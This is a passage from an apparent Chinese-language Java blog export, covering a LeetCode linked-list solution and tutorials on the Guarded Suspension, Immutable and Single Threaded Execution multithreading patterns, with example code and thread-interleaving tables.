<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">middleNode</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode fast = head;</span><br><span class="line">    ListNode slow = head;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">null</span> != fast &amp;&amp; <span class="keyword">null</span> != fast.next) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* slow = head;</span><br><span class="line">        ListNode* fast = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>Guarded Suspension 模式</title>
    <url>/2018/09/03/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.Guarded%20Suspension%20%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Guarded-Suspension-模式"><a href="#Guarded-Suspension-模式" class="headerlink" title="Guarded Suspension 模式"></a>Guarded Suspension 模式</h1><p>Guarded Suspension 模式通过让线程等待来保证示例的安全性。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Request</td>
<td>表示一个请求的类</td>
</tr>
<tr>
<td>RequestQueue</td>
<td>依次存放请求的类</td>
</tr>
<tr>
<td>ClientThread</td>
<td>发送请求的类</td>
</tr>
<tr>
<td>ServerThread</td>
<td>接收请求的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="示例程序的时序图"><a href="#示例程序的时序图" class="headerlink" title="示例程序的时序图"></a>示例程序的时序图</h3><p><img src="https://huhansi.github.io/images/Gaurded-Suspension%E6%A8%A1%E5%BC%8F%E6%97%B6%E5%BA%8F%E5%9B%BE.png" alt="时序图"></p>
<h3 id="Request类"><a href="#Request类" class="headerlink" title="Request类"></a>Request类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Request</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"[ Request "</span> + name + <span class="string">" ]"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="RequestQueue类"><a href="#RequestQueue类" class="headerlink" title="RequestQueue类"></a>RequestQueue类</h3><p>RequestQueue类用于依次存放请求。该类中定义了getRequest和putRequest两个方法。</p>
<h4 id="getRequest方法"><a href="#getRequest方法" class="headerlink" title="getRequest方法"></a>getRequest方法</h4><p>getRequest方法会去除最先存放在RequestQueue中的一个请求，作为其返回值。如果一个请求都没有，那就一直等待，知道其他某个线程执行putRequest。</p>
<h4 id="putRequest方法"><a href="#putRequest方法" class="headerlink" title="putRequest方法"></a>putRequest方法</h4><p>putR方法用于添加一个请求。当线程想要向RequestQueue添加Request实例，可调用该方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestQueue</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Queue&lt;Request&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Request <span class="title">getRequest</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> == queue.peek()) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> queue.remove();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">putRequest</span><span class="params">(Request request)</span> </span>&#123;</span><br><span class="line">		queue.offer(request);</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ClientThread类"><a href="#ClientThread类" class="headerlink" title="ClientThread类"></a>ClientThread类</h3><p>ClientThread类用于表示发送请求的线程。ClientThread持有RequestQueue的实例，并连续调用该实例的putRequest，放入请求。请求的名称依次为“No.0”、“No.1”……<br>为了错开发送请求的时间点，这里使用Random类随机生成了0-1000之间的数，来作为sleep的时间。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> RequestQueue requestQueue;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ClientThread</span><span class="params">(RequestQueue requestQueue, String name, <span class="keyword">long</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.requestQueue = requestQueue;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; <span class="number">10000</span>; index++) &#123;</span><br><span class="line">			Request request = <span class="keyword">new</span> Request(<span class="string">"No."</span> + index);</span><br><span class="line">			System.out.println(Thread.currentThread().getName() + <span class="string">" requests "</span> + request);</span><br><span class="line">			requestQueue.putRequest(request);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ServerThread类"><a href="#ServerThread类" class="headerlink" title="ServerThread类"></a>ServerThread类</h3><p>ServerThread用于表示接受请求的线程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> RequestQueue requestQueue;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ServerThread</span><span class="params">(RequestQueue requestQueue, String name, <span class="keyword">long</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.requestQueue = requestQueue;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>;index &lt; <span class="number">10000</span>; index++) &#123;</span><br><span class="line">			Request request = requestQueue.getRequest();</span><br><span class="line">			System.out.println(Thread.currentThread().getName() + <span class="string">" handles "</span> + request);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		RequestQueue requestQueue = <span class="keyword">new</span> RequestQueue();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(requestQueue, <span class="string">"Alice"</span>, <span class="number">3141592L</span>).start();</span><br><span class="line">		<span class="keyword">new</span> ServerThread(requestQueue, <span class="string">"Bobby"</span>, <span class="number">6535897L</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://huhansi.github.io/images/A.png" alt="执行结果"></p>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Guarded Suspension 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Immutable 模式</title>
    <url>/2018/09/03/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.Immutable%20%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Immutable-模式"><a href="#Immutable-模式" class="headerlink" title="Immutable 模式"></a>Immutable 模式</h1><p>java.lang.String类用于表示字符串。String类中并没有修改字符串内容的方法。也就是说，String类的实例所表示的字符串的内容绝对不会发生变化、</p>
<p>正因为如此，String类中的方法无需声明为synchronized。因为实例的内部状态不会发生改变，所以无论String类被多少个线程访问，也无需执行线程的互斥处理。</p>
<h2 id="实例程序"><a href="#实例程序" class="headerlink" title="实例程序"></a>实例程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Person</td>
<td>表示人的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
<tr>
<td>PrintPersonThread</td>
<td>显示Person实例的线程的类</td>
</tr>
</tbody></table>
<h3 id="Person类"><a href="#Person类" class="headerlink" title="Person类"></a>Person类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Persion</span> </span>&#123;    <span class="comment">// 声明为final，无法创建该类的子类</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String name;    <span class="comment">// 字段设置为private和final，表示一旦被赋了值，就不能再改变这个字段的值</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String address;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Persion</span><span class="params">(String name, String address)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.address = address;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.address;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"[ Person: name = "</span> + name + <span class="string">", address = "</span> + address  + <span class="string">" ]"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	Persion alice = <span class="keyword">new</span> Persion(<span class="string">"Alice"</span>, <span class="string">"Alaska"</span>);</span><br><span class="line">	<span class="keyword">new</span> PrintPersionThread(alice).start();</span><br><span class="line">	<span class="keyword">new</span> PrintPersionThread(alice).start();</span><br><span class="line">    <span class="keyword">new</span> PrintPersionThread(alice).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PrintPersonThread类"><a href="#PrintPersonThread类" class="headerlink" title="PrintPersonThread类"></a>PrintPersonThread类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrintPersionThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Persion persion;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">PrintPersionThread</span><span class="params">(Persion persion)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.persion = persion;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			System.out.println(Thread.currentThread().getName() + <span class="string">" prints "</span> + persion);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="实例程序的类图"><a href="#实例程序的类图" class="headerlink" title="实例程序的类图"></a>实例程序的类图</h3><p><img src="https://huhansi.github.io/images/immutable-class.png" alt="类图"><br>字段后面添加了{ frozen }约束，是UML的标识法，表示“实例被创建且字段被初始化之后，字段的值就不会被再修改”。这对应于java中的final字段。<br>方法名后面添加了{ concurrent }约束，这也是UML的标识法，它明确表示“多个线程同时执行也没有关系”。这对应于Java中的“无需声明为synchronized方法”</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《图解Java多线程设计模式》</p>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Immutable 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Single Threaded Execution模式</title>
    <url>/2018/09/02/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.Single%20Threaded%20Execution%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Single-Threaded-Execution模式"><a href="#Single-Threaded-Execution模式" class="headerlink" title="Single Threaded Execution模式"></a>Single Threaded Execution模式</h1><p>所谓Single Threaded Execution模式，意即“以一个线程执行”。就像独木桥同一时间只允许一个人通行一样，该模式用于设置限制，以确保同一时间内只能让一个线程执行处理。<br>Single Threaded Execution 有时候又被称作为临界区或临界域。Single Threaded Execution这个名称侧重于执行处理的线程，而临界区或临界域的名称侧重于执行范围。</p>
<h2 id="不使用Single-Threaded-Execution模式的程序"><a href="#不使用Single-Threaded-Execution模式的程序" class="headerlink" title="不使用Single Threaded Execution模式的程序"></a>不使用Single Threaded Execution模式的程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>创建门，并让三个人不断通过的类</td>
</tr>
<tr>
<td>Gate</td>
<td>表示门的类。 它会在人们通过门时记录其姓名与出生地</td>
</tr>
<tr>
<td>UserThread</td>
<td>表示人的类。人们将不断地通过门</td>
</tr>
<tr>
<td>### Main类</td>
<td></td>
</tr>
<tr>
<td>Main类将创建一个门，并让三个人不断地通过。首先Main类会创建Gate类的实例，并将该实例作为参数传递个UserThread类的构造函数。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Gate gate = <span class="keyword">new</span> Gate();</span><br><span class="line">		<span class="keyword">new</span> UserThread(gate, <span class="string">"Alice"</span>, <span class="string">"Alaska"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> UserThread(gate, <span class="string">"Bob"</span>, <span class="string">"Brazil"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> UserThread(gate, <span class="string">"Chris"</span>, <span class="string">"Canada"</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>### 非线程安全的Gate类</td>
<td></td>
</tr>
<tr>
<td>Gate类表示人通过的门。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gate</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> counter = <span class="number">0</span>;    <span class="comment">// 到目前为止通过的人数</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name = <span class="string">"nobody"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String address = <span class="string">"nowhere"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(String name, String address)</span> </span>&#123;    <span class="comment">// 通过门，将通过人数+1，赋值人名和地址</span></span><br><span class="line">		<span class="keyword">this</span>.counter++;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.address = address;</span><br><span class="line">		check();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"No."</span> + counter + <span class="string">": "</span> + name + <span class="string">", "</span> + address;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;    <span class="comment">// 检查当前门的状态</span></span><br><span class="line">		<span class="keyword">if</span> (name.charAt(<span class="number">0</span>) != address.charAt(<span class="number">0</span>)) &#123;</span><br><span class="line">			System.out.println(<span class="string">"******** BROKEN ********"</span> + toString());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
</tbody></table>
<h3 id="UserThread类"><a href="#UserThread类" class="headerlink" title="UserThread类"></a>UserThread类</h3><p>UserThread表示不断通过门的人</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Gate gate;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String myName;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String myAddress;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">UserThread</span><span class="params">(Gate gate, String myName, String myAddress)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.gate = gate;</span><br><span class="line">		<span class="keyword">this</span>.myName = myName;</span><br><span class="line">		<span class="keyword">this</span>.myAddress = myAddress;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(myName + <span class="string">" begin"</span>);</span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">			gate.pass(myName, myAddress);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/1.%E9%9D%9E%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8Gate%E7%B1%BB.PNG" alt="非线程安全类执行结果"></p>
<h3 id="为什么会出错"><a href="#为什么会出错" class="headerlink" title="为什么会出错"></a>为什么会出错</h3><p>因为pass方法会被多个线程执行，此处是3个。pass方法包含下面四条语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.counter++</span><br><span class="line"><span class="keyword">this</span>.name = name</span><br><span class="line"><span class="keyword">this</span>.address = address</span><br><span class="line">check()</span><br></pre></td></tr></table></figure>
<p>这里以两个线程举两个错误的例子。<br><strong>线程Alice和线程Bobby执行pass方法的情形1</strong></p>
<table>
<thead>
<tr>
<th>线程Alice</th>
<th>线程Bob</th>
<th>this.name的值</th>
<th>this.address的值</th>
</tr>
</thead>
<tbody><tr>
<td>this.counter++</td>
<td>this.counter++</td>
<td>（之前的值）</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td></td>
<td>“Bobby”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.name = name</td>
<td></td>
<td>“Alice”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.address = address</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td></td>
<td>this.address = address</td>
<td>“Alice”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td>check()</td>
<td>check()</td>
<td>“Alice”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>***** BROKEN *****</code></td>
<td></td>
</tr>
<tr>
<td><strong>线程Alice和线程Bobby执行pass方法的情形2</strong></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>线程Alice</th>
<th>线程Bob</th>
<th>this.name的值</th>
<th>this.address的值</th>
</tr>
</thead>
<tbody><tr>
<td>this.counter++</td>
<td>this.counter++</td>
<td>（之前的值）</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.name = name</td>
<td></td>
<td>“Alice”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td>this.name = name</td>
<td>“Bobby”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td>this.address = address</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td>this.address = address</td>
<td></td>
<td>“Bobby”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>check()</td>
<td>check()</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>***** BROKEN *****</code></td>
<td></td>
</tr>
</tbody></table>
<h2 id="使用Single-Threaded-Execution模式的程序"><a href="#使用Single-Threaded-Execution模式的程序" class="headerlink" title="使用Single Threaded Execution模式的程序"></a>使用Single Threaded Execution模式的程序</h2><p>这边只要将Gate类改为线程安全的类即可，其他的类不需要修改。</p>
<h3 id="线程安全的Gate类"><a href="#线程安全的Gate类" class="headerlink" title="线程安全的Gate类"></a>线程安全的Gate类</h3><p>分别有两处修改，在pass和toString方法签名中加入了synchronized关键字，这样一来Gate类就变成了线程安全的类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gate</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name = <span class="string">"nobody"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String address = <span class="string">"nowhere"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(String name, String address)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.counter++;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.address = address;</span><br><span class="line">		check();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"No."</span> + counter + <span class="string">": "</span> + name + <span class="string">", "</span> + address;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (name.charAt(<span class="number">0</span>) != address.charAt(<span class="number">0</span>)) &#123;</span><br><span class="line">			System.out.println(<span class="string">"******** BROKEN ********"</span> + toString());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>如图所示：</strong> 无论执行多久，都不会再有其他输出。</p>
<p><img src="https://huhansi.github.io/images/2.%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8Gate%E7%B1%BB.PNG" alt="线程安全类执行结果"></p>
<p><strong>线程Alice和线程Bobby执行pass方法的情形1</strong></p>
<table>
<thead>
<tr>
<th>线程Alice</th>
<th>线程Bob</th>
<th>this.name的值</th>
<th>this.address的值</th>
</tr>
</thead>
<tbody><tr>
<td>获取锁</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>this.counter++</td>
<td></td>
<td>（之前的值）</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.name = name</td>
<td></td>
<td>“Alice”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.address = address</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>check()</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>释放锁</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>获取锁</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>this.count++</td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td></td>
<td>this.name = name</td>
<td>“Bobby”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td></td>
<td>this.address = address</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td>check()</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td>释放锁</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>线程Alice和线程Bobby执行pass方法的情形2</strong></p>
<table>
<thead>
<tr>
<th>线程Alice</th>
<th>线程Bob</th>
<th>this.name的值</th>
<th>this.address的值</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>获取锁</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>this.counter++</td>
<td>（之前的值）</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
